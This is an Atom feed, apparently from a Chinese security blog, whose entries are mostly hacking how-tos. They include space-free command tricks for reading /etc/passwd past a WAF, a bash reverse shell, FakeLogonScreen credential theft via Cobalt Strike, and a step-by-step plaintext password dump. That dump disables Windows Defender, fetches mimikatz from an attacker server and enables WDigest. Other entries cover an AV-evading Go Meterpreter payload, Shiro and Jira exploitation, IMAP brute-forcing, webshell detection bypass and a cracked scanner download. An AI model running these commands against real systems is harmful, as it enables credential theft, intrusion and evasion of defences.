+<p>由于官方发布的线上地址使用了google统计，为了安全，还是自己搭建或者本地使用。本地就仅限于自己的电脑才可使用。所以搭建自己线上的可以随时使用，方便许多。同时配合Open in CyberChef这个浏览器插件就更加方便。</p>
+<p>直接下载官方生成的包，下载地址：<a href="https://github.com/gchq/CyberChef/releases">https://github.com/gchq/CyberChef/releases</a></p>
+<p>我这里直接上传到github，并且启用github pages。然后绑定解析自己的域名即可线上访问。我这里搭建好的无google统计的地址：<a href="https://cyberchef.bacde.me">https://cyberchef.bacde.me</a></p>
+<p>接下来安装Open in CyberChef 这个chrome插件。插件地址:<a href="https://chrome.google.com/webstore/detail/open-in-cyberchef/aandeoaihmciockajcgadkgknejppjdl/related">https://chrome.google.com/webstore/detail/open-in-cyberchef/aandeoaihmciockajcgadkgknejppjdl/related</a></p>
+<p>这样就可以直接右键发送到自己的cyberchef，方便了很多。使用效果如下：</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Hunting Tips Mindmap]]></title>
+        <id>https://bacde.me/post/hunting-tips-mindmap/</id>
+        <link href="https://bacde.me/post/hunting-tips-mindmap/">
+        </link>
+        <updated>2020-04-03T03:29:17.000Z</updated>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[bashtricks ：无空格命令执行]]></title>
+        <id>https://bacde.me/post/bashtricks-execute-commands-without-space/</id>
+        <link href="https://bacde.me/post/bashtricks-execute-commands-without-space/">
+        </link>
+        <updated>2020-03-22T04:19:12.000Z</updated>
+        <summary type="html"><![CDATA[<p>在一些漏洞利用场景，或者因为waf等原因，导致无法使用空格时，可以试试如下命令：</p>
+<pre><code>IFS=,;`cat&lt;&lt;&lt;cat,/etc/passwd` 
+cat$IFS/etc/passwd 
+cat${IFS}/etc/passwd 
+cat&lt;/etc/passwd 
+{cat,/etc/passwd} 
+X=$'cat\x20/etc/passwd'&amp;&amp;$X
+</code></pre>
+<p>经过测试，除最后一条在mac osx下执行失败，这些命令在ubuntu 19.10和centos7下均执行成功。在mac osx系统下系统会将cat\x20/etc/passwd当成一个可执行文件，会提示No such file or directory。</p>
+<p>来源：<a href="https://twitter.com/omespino/status/1241544334329208838">https://twitter.com/omespino/status/1241544334329208838</a></p>
+]]></summary>
+        <content type="html"><![CDATA[<p>在一些漏洞利用场景，或者因为waf等原因，导致无法使用空格时，可以试试如下命令：</p>
+<pre><code>IFS=,;`cat&lt;&lt;&lt;cat,/etc/passwd` 
+cat$IFS/etc/passwd 
+cat${IFS}/etc/passwd 
+cat&lt;/etc/passwd 
+{cat,/etc/passwd} 
+X=$'cat\x20/etc/passwd'&amp;&amp;$X
+</code></pre>
+<p>经过测试，除最后一条在mac osx下执行失败，这些命令在ubuntu 19.10和centos7下均执行成功。在mac osx系统下系统会将cat\x20/etc/passwd当成一个可执行文件，会提示No such file or directory。</p>
+<p>来源：<a href="https://twitter.com/omespino/status/1241544334329208838">https://twitter.com/omespino/status/1241544334329208838</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[BigIP Cookie 解码获取真实IP]]></title>
+        <id>https://bacde.me/post/bigip-cookie-decode-get-real-ip/</id>
+        <link href="https://bacde.me/post/bigip-cookie-decode-get-real-ip/">
+        </link>
+        <updated>2020-03-21T07:02:57.000Z</updated>
+        <summary type="html"><![CDATA[<p>BIGip是对负载均衡的实现，主要通过Virtual Server、iRules、Pool、Node、Monitor和Persistent（会话保持）实现。BIGip在实现会话保持机制时会在用户首次发起请求时，会为用户设置一个cookie，即服务端会添加set-cookie响应头头（比如：Set-Cookie: BIGipServer<sub>FinanceAndAdminWeb</sub>fo.unc.edu=105389996.20480.0000 ）。后续的请求会判断并使用这个cookie值，服务端解码该cookie并使用服务器。</p>
+<p>最近发现一款工具，可以解BigIP的cookie，以此获取内网ip或者真实ip地址。这款工具名叫rabid，是ruby语言编写，支持4种cookie格式。github地址：<a href="https://github.com/Orange-Cyberdefense/rabid">https://github.com/Orange-Cyberdefense/rabid</a></p>
+<h2 id="工具使用">工具使用</h2>
+<p>工具使用ruby编写，需要ruby 2.4以上版本的环境。首先要保证安装好ruby。然后使用gem安装包</p>
+<p><code>gem install rabid</code></p>
+<p>安装完成后，可以使用ruby包含该库，也可以直接运行命令执行。</p>
+<p>命令示例如下：<br>
+<code>rabid 'BIGipServer~FinanceAndAdminWeb~fo.unc.edu=105389996.20480.0000'</code></p>
+<p>上面的参数就是set-cookie的值。</p>
+<p>运行结果(运行环境macos，ruby 2.6.3)：</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>BIGip是对负载均衡的实现，主要通过Virtual Server、iRules、Pool、Node、Monitor和Persistent（会话保持）实现。BIGip在实现会话保持机制时会在用户首次发起请求时，会为用户设置一个cookie，即服务端会添加set-cookie响应头头（比如：Set-Cookie: BIGipServer<sub>FinanceAndAdminWeb</sub>fo.unc.edu=105389996.20480.0000 ）。后续的请求会判断并使用这个cookie值，服务端解码该cookie并使用服务器。</p>
+<p>最近发现一款工具，可以解BigIP的cookie，以此获取内网ip或者真实ip地址。这款工具名叫rabid，是ruby语言编写，支持4种cookie格式。github地址：<a href="https://github.com/Orange-Cyberdefense/rabid">https://github.com/Orange-Cyberdefense/rabid</a></p>
+<h2 id="工具使用">工具使用</h2>
+<p>工具使用ruby编写，需要ruby 2.4以上版本的环境。首先要保证安装好ruby。然后使用gem安装包</p>
+<p><code>gem install rabid</code></p>
+<p>安装完成后，可以使用ruby包含该库，也可以直接运行命令执行。</p>
+<p>命令示例如下：<br>
+<code>rabid 'BIGipServer~FinanceAndAdminWeb~fo.unc.edu=105389996.20480.0000'</code></p>
+<p>上面的参数就是set-cookie的值。</p>
+<p>运行结果(运行环境macos，ruby 2.6.3)：</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[ SMBGhost 蓝屏代码（测试成功）]]></title>
+        <id>https://bacde.me/post/smbghost-crash-poc/</id>
+        <link href="https://bacde.me/post/smbghost-crash-poc/">
+        </link>
+        <updated>2020-03-18T08:54:13.000Z</updated>
+        <summary type="html"><![CDATA[<p>CVE-2020-0796 蓝屏的代码。twitter上发现的。本地虚拟机，Windows10专业版1903测试成功.</p>
+<figure data-type="image" tabindex="1"><img src="https://bacde.me/post-images/1584521689217.png" alt="" loading="lazy"></figure>
+<p>使用方法：</p>
+<p>安装impacket库</p>
+<pre><code>git clone https://github.com/SecureAuthCorp/impacket.git
+cd impacket
+python setup.py install
+</code></pre>
+<p>直接使用pip安装的不行，所以clone最新版本的，然后安装，在Mac系统下需要sudo权限。</p>
+<p>安装成功后，下载该代码。执行如下命令：</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>CVE-2020-0796 蓝屏的代码。twitter上发现的。本地虚拟机，Windows10专业版1903测试成功.</p>
+<figure data-type="image" tabindex="1"><img src="https://bacde.me/post-images/1584521689217.png" alt="" loading="lazy"></figure>
+<p>使用方法：</p>
+<p>安装impacket库</p>
+<pre><code>git clone https://github.com/SecureAuthCorp/impacket.git
+cd impacket
+python setup.py install
+</code></pre>
+<p>直接使用pip安装的不行，所以clone最新版本的，然后安装，在Mac系统下需要sudo权限。</p>
+<p>安装成功后，下载该代码。执行如下命令：</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[分享个学习shell脚本或辅助理解的网站-explainshell.com]]></title>
+        <id>https://bacde.me/post/share-explainshell/</id>
+        <link href="https://bacde.me/post/share-explainshell/">
+        </link>
+        <updated>2020-03-05T02:27:22.000Z</updated>
+        <summary type="html"><![CDATA[<p>有的时候我们会遇到一些特别难理解的shell命令，或者是一些参数我们不知道它的作用。那么今天分享的这个网址可以帮助解决上面的烦恼。</p>
+<p>网站主页打开后就是一个输入框。输入命令后，就会给出解析的结果。结果包含了解析的结果，并在下面给出了详细的说明。很方便。例如我们以<code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</code> 为例（如下图），很酷～</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>有的时候我们会遇到一些特别难理解的shell命令，或者是一些参数我们不知道它的作用。那么今天分享的这个网址可以帮助解决上面的烦恼。</p>
+<p>网站主页打开后就是一个输入框。输入命令后，就会给出解析的结果。结果包含了解析的结果，并在下面给出了详细的说明。很方便。例如我们以<code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</code> 为例（如下图），很酷～</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[伪造windows登录屏幕窃取密码之FakeLogonScreen]]></title>
+        <id>https://bacde.me/post/Fake-Windows-Logon-Screen-To-Steal-Passwords/</id>
+        <link href="https://bacde.me/post/Fake-Windows-Logon-Screen-To-Steal-Passwords/">
+        </link>
+        <updated>2020-03-03T04:02:40.000Z</updated>
+        <summary type="html"><![CDATA[<p>在windows环境中，获取系统密码，提升系统权限。在渗透测试是经常遇到的。今天这里介绍一款伪造windows登录屏幕以达到窃取密码或题全的软件——FakeLogonScreen。</p>
+<h2 id="简介">简介</h2>
+<p>FakeLogonScreen这个程序是用于伪造windows登录凭证以获取系统登录密码。它会获取当前系统配置的背景图片，这样显得更加真实，成功率也会更高。</p>
+<p>另外，该程序会对输入的密码进行Active Directory或本地计算机的认证，以确保窃取密码的准确性。它可以显示在控制台，也可以保存早文件远程系统的硬盘上。</p>
+<p>这个软件的好处就是可以与其它工具配合使用，可以直接通过内存执行（无文件）。比如可以配合Cobalt Strike的execute-assembly来执行。</p>
+<h2 id="运行环境">运行环境</h2>
+<p>由于使用c#编写，需要系统中有.net framework框架。这里测试windows10和windows7，系统均为64位。在其release的版本中，作者给出来.net framework3.5和4.5的可执行程序。适用于windows7 和windows10等情况。实际中可根据实际情况进行选择。</p>
+<h2 id="利用">利用</h2>
+<p>可以配合Cobalt Strike，系统上线后，进入到beacon中，然后直接执行<code>execute-assembly /root/Desktop/FakeLogonScreen.exe</code> 。（后面为控制机上的文件路径，非被控机的路径）。接下来就是等待对方输入密码，即可在进入的beacon中显示输入的密码了。效果图如下：</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>在windows环境中，获取系统密码，提升系统权限。在渗透测试是经常遇到的。今天这里介绍一款伪造windows登录屏幕以达到窃取密码或题全的软件——FakeLogonScreen。</p>
+<h2 id="简介">简介</h2>
+<p>FakeLogonScreen这个程序是用于伪造windows登录凭证以获取系统登录密码。它会获取当前系统配置的背景图片，这样显得更加真实，成功率也会更高。</p>
+<p>另外，该程序会对输入的密码进行Active Directory或本地计算机的认证，以确保窃取密码的准确性。它可以显示在控制台，也可以保存早文件远程系统的硬盘上。</p>
+<p>这个软件的好处就是可以与其它工具配合使用，可以直接通过内存执行（无文件）。比如可以配合Cobalt Strike的execute-assembly来执行。</p>
+<h2 id="运行环境">运行环境</h2>
+<p>由于使用c#编写，需要系统中有.net framework框架。这里测试windows10和windows7，系统均为64位。在其release的版本中，作者给出来.net framework3.5和4.5的可执行程序。适用于windows7 和windows10等情况。实际中可根据实际情况进行选择。</p>
+<h2 id="利用">利用</h2>
+<p>可以配合Cobalt Strike，系统上线后，进入到beacon中，然后直接执行<code>execute-assembly /root/Desktop/FakeLogonScreen.exe</code> 。（后面为控制机上的文件路径，非被控机的路径）。接下来就是等待对方输入密码，即可在进入的beacon中显示输入的密码了。效果图如下：</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Windows Server 2016抓取明文密码]]></title>
+        <id>https://bacde.me/post/Windows-Server-2016-Get-Plaintext-Password/</id>
+        <link href="https://bacde.me/post/Windows-Server-2016-Get-Plaintext-Password/">
+        </link>
+        <updated>2020-03-02T00:46:50.000Z</updated>
+        <summary type="html"><![CDATA[<p>临时禁止Windows Defender</p>
+<pre><code>REG ADD &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+gpupdate /force
+</code></pre>
+<p>下载mimikatz后解压缩。</p>
+<pre><code>powershell.exe -NoP -NonI -Exec Bypass -Command &quot;&amp; {Import-Module BitsTransfer; Start-BitsTransfer 'http://你的服务器/mimikatz_trunk.zip' &quot;%APPDATA%\mimikatz_trunk.zip&quot;}&quot;
+</code></pre>
+<p>修改注册表开启UseLogonCredential</p>
+<pre><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+</code></pre>
+<p>等用户下次再登录的时候,可抓到明文密码</p>
+<pre><code>mimikatz.exe privilege::debug
+sekurlsa::logonpasswords exit
+</code></pre>
+]]></summary>
+        <content type="html"><![CDATA[<p>临时禁止Windows Defender</p>
+<pre><code>REG ADD &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+gpupdate /force
+</code></pre>
+<p>下载mimikatz后解压缩。</p>
+<pre><code>powershell.exe -NoP -NonI -Exec Bypass -Command &quot;&amp; {Import-Module BitsTransfer; Start-BitsTransfer 'http://你的服务器/mimikatz_trunk.zip' &quot;%APPDATA%\mimikatz_trunk.zip&quot;}&quot;
+</code></pre>
+<p>修改注册表开启UseLogonCredential</p>
+<pre><code>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+</code></pre>
+<p>等用户下次再登录的时候,可抓到明文密码</p>
+<pre><code>mimikatz.exe privilege::debug
+sekurlsa::logonpasswords exit
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Golang实现的x86下的Meterpreter reverse tcp]]></title>
+        <id>https://bacde.me/post/golang-x86-meterpreter-reverse-tcp/</id>
+        <link href="https://bacde.me/post/golang-x86-meterpreter-reverse-tcp/">
+        </link>
+        <updated>2020-02-23T04:42:11.000Z</updated>
+        <summary type="html"><![CDATA[<p>Golang实现的x86下的Meterpreter reverse tcp。地址：<a href="https://github.com/insightglacier/go_meterpreter">https://github.com/insightglacier/go_meterpreter</a></p>
+<p>做静态免杀实验，代码修改自<a href="https://github.com/EgeBalci/EGESPLOIT">EGESPLOIT</a> 这个开源项目。单独实现主要在于减小程序编译后体积。目前编译后的大小在1.2M左右。</p>
+<h2 id="使用方法">使用方法</h2>
+<p>修改go_meterpreter.go中125行代码 s := &quot;http://192.168.121.131:8989&quot; IP和端口修改为自己的地址。然后就可以go build了。</p>
+<pre><code>set GOARCH=386
+go build -ldflags=&quot;-H windowsgui -w&quot;   
+</code></pre>
+<p>注意上面参数中没有-s，因为实际测试，使用这种方式build后的程序免杀效果会好一些。如果直接go build，程序会有窗口，同时大小也在1.6M左右。</p>
+<p>由于加入了这部分代码，运行后因为执行多次无用代码，需要等一会才可以看到上线。另外目前会出现连接两次msf的情况，但是只有一个连接会返回shell，目前没找到原因。</p>
+<h2 id="免杀效果">免杀效果</h2>
+<p>加入了Bypass AV的代码。</p>
+<p>我在刚写好的时候上传到VT，查杀结果位8/62。VT上有超过70个引擎，62个应该是加入BypassAV代码起的作用。</p>
+<p>今天最新经过编译查杀结果为20/70。由于现在杀毒都有云查杀，刚写的时候效果好，但是过几天就被被杀。这里具体可以结合一些其他方式来尝试绕过。</p>
+<p>VT检测结果地址：<a href="https://www.virustotal.com/gui/file/f8ff4acac418e6cdc326d0139ba2bdb9fce32558985962cf8303fcc97b9e47fb/detection">https://www.virustotal.com/gui/file/f8ff4acac418e6cdc326d0139ba2bdb9fce32558985962cf8303fcc97b9e47fb/detection</a></p>
+<p>在使用这个的过程中，Windows10中自带的杀毒软件会拦截。会被动态行为发现。这里仅是过静态查杀测试。</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>Golang实现的x86下的Meterpreter reverse tcp。地址：<a href="https://github.com/insightglacier/go_meterpreter">https://github.com/insightglacier/go_meterpreter</a></p>
+<p>做静态免杀实验，代码修改自<a href="https://github.com/EgeBalci/EGESPLOIT">EGESPLOIT</a> 这个开源项目。单独实现主要在于减小程序编译后体积。目前编译后的大小在1.2M左右。</p>
+<h2 id="使用方法">使用方法</h2>
+<p>修改go_meterpreter.go中125行代码 s := &quot;http://192.168.121.131:8989&quot; IP和端口修改为自己的地址。然后就可以go build了。</p>
+<pre><code>set GOARCH=386
+go build -ldflags=&quot;-H windowsgui -w&quot;   
+</code></pre>
+<p>注意上面参数中没有-s，因为实际测试，使用这种方式build后的程序免杀效果会好一些。如果直接go build，程序会有窗口，同时大小也在1.6M左右。</p>
+<p>由于加入了这部分代码，运行后因为执行多次无用代码，需要等一会才可以看到上线。另外目前会出现连接两次msf的情况，但是只有一个连接会返回shell，目前没找到原因。</p>
+<h2 id="免杀效果">免杀效果</h2>
+<p>加入了Bypass AV的代码。</p>
+<p>我在刚写好的时候上传到VT，查杀结果位8/62。VT上有超过70个引擎，62个应该是加入BypassAV代码起的作用。</p>
+<p>今天最新经过编译查杀结果为20/70。由于现在杀毒都有云查杀，刚写的时候效果好，但是过几天就被被杀。这里具体可以结合一些其他方式来尝试绕过。</p>
+<p>VT检测结果地址：<a href="https://www.virustotal.com/gui/file/f8ff4acac418e6cdc326d0139ba2bdb9fce32558985962cf8303fcc97b9e47fb/detection">https://www.virustotal.com/gui/file/f8ff4acac418e6cdc326d0139ba2bdb9fce32558985962cf8303fcc97b9e47fb/detection</a></p>
+<p>在使用这个的过程中，Windows10中自带的杀毒软件会拦截。会被动态行为发现。这里仅是过静态查杀测试。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Acunetix Web Vulnerability Scanner（AWVS） 13 破解版]]></title>
+        <id>https://bacde.me/post/Acunetix-Web-Vulnerability-Scanner-13-cracked/</id>
+        <link href="https://bacde.me/post/Acunetix-Web-Vulnerability-Scanner-13-cracked/">
+        </link>
+        <updated>2020-02-22T14:04:06.000Z</updated>
+        <summary type="html"><![CDATA[<p>今天看到有群里分享Acunetix Web Vulnerability Scanner(AWVS)13的破解版本，这里分享一下～</p>
+<p>Windows下载地址：<br>
+<a href="https://pan.baidu.com/s/10y_nGpe-rLHqRoyB4Hz3BQ" title="百度盘下载地址">https://pan.baidu.com/s/10y_nGpe-rLHqRoyB4Hz3BQ</a></p>
+<p>Linux 下载地址：<br>
+<a href="https://mega.nz/#!JAxkRQgB!RcaAd5-zHKTNQHD28YcAocKB4RVoNDrOZRnL5bCLj0g">https://mega.nz/#!JAxkRQgB!RcaAd5-zHKTNQHD28YcAocKB4RVoNDrOZRnL5bCLj0g</a></p>
+<p>官网介绍地址<br>
+<a href="https://www.acunetix.com/vulnerability-scanner/">https://www.acunetix.com/vulnerability-scanner/</a></p>
+<p><strong>注：工具来源于网络，请自行验证是否存在后门等情况，为了安全考虑建议使用虚拟机运行。</strong></p>
+]]></summary>
+        <content type="html"><![CDATA[<p>今天看到有群里分享Acunetix Web Vulnerability Scanner(AWVS)13的破解版本，这里分享一下～</p>
+<p>Windows下载地址：<br>
+<a href="https://pan.baidu.com/s/10y_nGpe-rLHqRoyB4Hz3BQ" title="百度盘下载地址">https://pan.baidu.com/s/10y_nGpe-rLHqRoyB4Hz3BQ</a></p>
+<p>Linux 下载地址：<br>
+<a href="https://mega.nz/#!JAxkRQgB!RcaAd5-zHKTNQHD28YcAocKB4RVoNDrOZRnL5bCLj0g">https://mega.nz/#!JAxkRQgB!RcaAd5-zHKTNQHD28YcAocKB4RVoNDrOZRnL5bCLj0g</a></p>
+<p>官网介绍地址<br>
+<a href="https://www.acunetix.com/vulnerability-scanner/">https://www.acunetix.com/vulnerability-scanner/</a></p>
+<p><strong>注：工具来源于网络，请自行验证是否存在后门等情况，为了安全考虑建议使用虚拟机运行。</strong></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Apache Shiro 反序列化漏洞利用工具使用]]></title>
+        <id>https://bacde.me/post/Apache-Shiro-Deserialize-Vulnerability-Tool/</id>
+        <link href="https://bacde.me/post/Apache-Shiro-Deserialize-Vulnerability-Tool/">
+        </link>
+        <updated>2020-02-15T06:02:42.000Z</updated>
+        <summary type="html"><![CDATA[<p>Shiro_exploit用于检测与利用Apache Shiro反序列化漏洞脚本。可以帮助企业发现自身安全漏洞。</p>
+<p>工具下载地址：<a href="https://github.com/insightglacier/Shiro_exploit">Shiro_Exploit</a></p>
+<p>该脚本通过网络收集到的22个key，利用ysoserial工具中的URLDNS这个Gadget，并结合dnslog平台实现漏洞检测。漏洞利用则可以选择Gadget和参数，增强灵活性。</p>
+<h1 id="环境">环境</h1>
+<p>Python2.7</p>
+<p>requests</p>
+<p>Jdk 1.8</p>
+<h1 id="使用说明">使用说明</h1>
+<pre><code>usage: shiro_exploit.py [-h] -u URL [-t TYPE] [-g GADGET] [-p PARAMS] [-k KEY]
+
+OPTIONS:
+-h, --help            show this help message and exit
+-u URL, --url URL     Target url.
+-t TYPE, --type TYPE  Check or Exploit. Check :1 , Exploit:2 , Find gadget:3
+-g GADGET, --gadget GADGET
+                        gadget
+-p PARAMS, --params PARAMS
+                        gadget params
+-k KEY, --key KEY     CipherKey
+
+Example: python shiro_exploit.py -u target
+</code></pre>
+<p>检测默认只需要使用-u参数即可。</p>
+<p>检测可用gadget的方式可以运行</p>
+<p>python shiro_exploit.py -u http://target/ -t 3 -p &quot;ping -c 2 {dnshost}&quot; -k &quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</p>
+<p>程序执行时会获取dnslog的域名替换  <code>{dnshost}</code> 这个值。不需要进行修改。目前还没解决windows和linux系统通用性的问题。这里-p自己根据实际情况指定下吧。</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>Shiro_exploit用于检测与利用Apache Shiro反序列化漏洞脚本。可以帮助企业发现自身安全漏洞。</p>
+<p>工具下载地址：<a href="https://github.com/insightglacier/Shiro_exploit">Shiro_Exploit</a></p>
+<p>该脚本通过网络收集到的22个key，利用ysoserial工具中的URLDNS这个Gadget，并结合dnslog平台实现漏洞检测。漏洞利用则可以选择Gadget和参数，增强灵活性。</p>
+<h1 id="环境">环境</h1>
+<p>Python2.7</p>
+<p>requests</p>
+<p>Jdk 1.8</p>
+<h1 id="使用说明">使用说明</h1>
+<pre><code>usage: shiro_exploit.py [-h] -u URL [-t TYPE] [-g GADGET] [-p PARAMS] [-k KEY]
+
+OPTIONS:
+-h, --help            show this help message and exit
+-u URL, --url URL     Target url.
+-t TYPE, --type TYPE  Check or Exploit. Check :1 , Exploit:2 , Find gadget:3
+-g GADGET, --gadget GADGET
+                        gadget
+-p PARAMS, --params PARAMS
+                        gadget params
+-k KEY, --key KEY     CipherKey
+
+Example: python shiro_exploit.py -u target
+</code></pre>
+<p>检测默认只需要使用-u参数即可。</p>
+<p>检测可用gadget的方式可以运行</p>
+<p>python shiro_exploit.py -u http://target/ -t 3 -p &quot;ping -c 2 {dnshost}&quot; -k &quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</p>
+<p>程序执行时会获取dnslog的域名替换  <code>{dnshost}</code> 这个值。不需要进行修改。目前还没解决windows和linux系统通用性的问题。这里-p自己根据实际情况指定下吧。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CVE-2019-8449 Jira 枚举用户漏洞的利用]]></title>
+        <id>https://bacde.me/post/cve-2019-8449-jira-enum-usernames/</id>
+        <link href="https://bacde.me/post/cve-2019-8449-jira-enum-usernames/">
+        </link>
+        <updated>2020-02-13T13:51:48.000Z</updated>
+        <summary type="html"><![CDATA[<p>一个很攻击门槛很低的漏洞。可结合其它漏洞配合来进行攻击。</p>
+<p>首先来简单说一下这个漏洞，该漏洞就是在Jira 8.4.0以前的版本，攻击者可以在不经过授权的情况下访问/rest/api/latest/groupuserpicker这个路径来枚举用户。漏洞危害评级中危。</p>
+<p>2020年2月3日在exploit-db上公布了该漏洞利用脚本。地址：<br>
+<a href="https://www.exploit-db.com/exploits/47990">Jira 8.3.4 - Information Disclosure (Username Enumeration)</a> 。</p>
+<p>其漏洞很简单，只需要访问 http://target/rest/api/latest/groupuserpicker?query=admin （target为目标jira系统地址）。如果返回的是json字符串就说明存在漏洞。如果返回&quot;You are not authenticated. Authentication required to perform this operation.&quot; 则说明不存在这个漏洞。</p>
+<p>那漏洞应该如何利用呢？<br>
+1、通过字典方式，探测用户是否存在。<br>
+2、如果存在漏洞，那么一旦匹配到结果，则会返回json格式的字符串，其中包含来用户民、邮箱、和显示的名字信息。在实际测试中发现，请求的参数不一定是用户的全拼，例如我们输入c，也是可以返回相关结果的。我们可以改变query参数的值，从a至z遍历。这样就可以获取系统中的用户名列表。</p>
+<p>通过以上获取信息后，可以进行后续的利用。比如爆破用户密码，邮箱密码，发送钓鱼邮件等等。具体根据实际场景和相关经验进行扩展。</p>
+<h1 id="相关连接">相关连接</h1>
+<ol>
+<li>
+<p><a href="https://www.exploit-db.com/exploits/47990">Jira 8.3.4 - Information Disclosure (Username Enumeration)</a></p>
+</li>
+<li>
+<p><a href="https://www.doyler.net/security-not-included/more-jira-enumeration">More Jira Enumeration (usernames) – CVE-2019-8449</a></p>
+</li>
+<li>
+<p><a href="https://jira.atlassian.com/browse/JRASERVER-69796">User enumeration through the groupuserpicker api resource - CVE-2019-8449</a></p>
+</li>
+</ol>
+]]></summary>
+        <content type="html"><![CDATA[<p>一个很攻击门槛很低的漏洞。可结合其它漏洞配合来进行攻击。</p>
+<p>首先来简单说一下这个漏洞，该漏洞就是在Jira 8.4.0以前的版本，攻击者可以在不经过授权的情况下访问/rest/api/latest/groupuserpicker这个路径来枚举用户。漏洞危害评级中危。</p>
+<p>2020年2月3日在exploit-db上公布了该漏洞利用脚本。地址：<br>
+<a href="https://www.exploit-db.com/exploits/47990">Jira 8.3.4 - Information Disclosure (Username Enumeration)</a> 。</p>
+<p>其漏洞很简单，只需要访问 http://target/rest/api/latest/groupuserpicker?query=admin （target为目标jira系统地址）。如果返回的是json字符串就说明存在漏洞。如果返回&quot;You are not authenticated. Authentication required to perform this operation.&quot; 则说明不存在这个漏洞。</p>
+<p>那漏洞应该如何利用呢？<br>
+1、通过字典方式，探测用户是否存在。<br>
+2、如果存在漏洞，那么一旦匹配到结果，则会返回json格式的字符串，其中包含来用户民、邮箱、和显示的名字信息。在实际测试中发现，请求的参数不一定是用户的全拼，例如我们输入c，也是可以返回相关结果的。我们可以改变query参数的值，从a至z遍历。这样就可以获取系统中的用户名列表。</p>
+<p>通过以上获取信息后，可以进行后续的利用。比如爆破用户密码，邮箱密码，发送钓鱼邮件等等。具体根据实际场景和相关经验进行扩展。</p>
+<h1 id="相关连接">相关连接</h1>
+<ol>
+<li>
+<p><a href="https://www.exploit-db.com/exploits/47990">Jira 8.3.4 - Information Disclosure (Username Enumeration)</a></p>
+</li>
+<li>
+<p><a href="https://www.doyler.net/security-not-included/more-jira-enumeration">More Jira Enumeration (usernames) – CVE-2019-8449</a></p>
+</li>
+<li>
+<p><a href="https://jira.atlassian.com/browse/JRASERVER-69796">User enumeration through the groupuserpicker api resource - CVE-2019-8449</a></p>
+</li>
+</ol>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[企业邮箱爆破脚本]]></title>
+        <id>https://bacde.me/post/IMAP-Bruteforce-Script/</id>
+        <link href="https://bacde.me/post/IMAP-Bruteforce-Script/">
+        </link>
+        <updated>2020-01-02T13:35:45.000Z</updated>
+        <summary type="html"><![CDATA[<p>IMAP（Internet Mail Access Protocol）以前称作交互邮件访问协议（Interactive Mail Access Protocol），是一个应用层协议。IMAP是斯坦福大学在1986年开发的一种邮件获取协议。它的主要作用是邮件客户端可以通过这种协议从邮件服务器上获取邮件的信息，下载邮件等。当前的权威定义是RFC3501。IMAP协议运行在TCP/IP协议之上，使用的端口是143。它与POP3协议的主要区别是用户可以不用把所有的邮件全部下载，可以通过客户端直接对服务器上的邮件进行操作。----来源于百度百科</p>
+<p>目前知名企业邮箱（如腾讯企业邮箱）均支持该协议，许多人喜欢用邮件客户端或者手机收发邮件，则大多数会选择开启该服务。在大多数情况下适用。（文末有脚本下载地址）。</p>
+<p>该脚本使用Python开发，2和3版本均可运行。<br>
+<img src="https://bacde.me/post-images/1577972620061.png" alt="" loading="lazy"></p>
+]]></summary>
+        <content type="html"><![CDATA[<p>IMAP（Internet Mail Access Protocol）以前称作交互邮件访问协议（Interactive Mail Access Protocol），是一个应用层协议。IMAP是斯坦福大学在1986年开发的一种邮件获取协议。它的主要作用是邮件客户端可以通过这种协议从邮件服务器上获取邮件的信息，下载邮件等。当前的权威定义是RFC3501。IMAP协议运行在TCP/IP协议之上，使用的端口是143。它与POP3协议的主要区别是用户可以不用把所有的邮件全部下载，可以通过客户端直接对服务器上的邮件进行操作。----来源于百度百科</p>
+<p>目前知名企业邮箱（如腾讯企业邮箱）均支持该协议，许多人喜欢用邮件客户端或者手机收发邮件，则大多数会选择开启该服务。在大多数情况下适用。（文末有脚本下载地址）。</p>
+<p>该脚本使用Python开发，2和3版本均可运行。<br>
+<img src="https://bacde.me/post-images/1577972620061.png" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[青藤云Webshell查杀绕过]]></title>
+        <id>https://bacde.me/post/QingtengCloud-Bypass-Php-Webshell/</id>
+        <link href="https://bacde.me/post/QingtengCloud-Bypass-Php-Webshell/">
+        </link>
+        <updated>2019-12-30T12:52:58.000Z</updated>
+        <summary type="html"><![CDATA[<p>上周看到一些朋友在发青藤云的聊天记录，绕过一个发200块红包。周末的时候就简单做了个测试。<br>
+首先使用绕过D盾的webshell，发现被标记为恶意。这就有点意思了。我去看了一下聊天记录的内容，看原理是采用的深度学习的方式。猜测是有监督的方式来实现的（仅为猜测）。我这里绕过的思路采用的是，使用开源程序进行修改，带入一句话后门代码。</p>
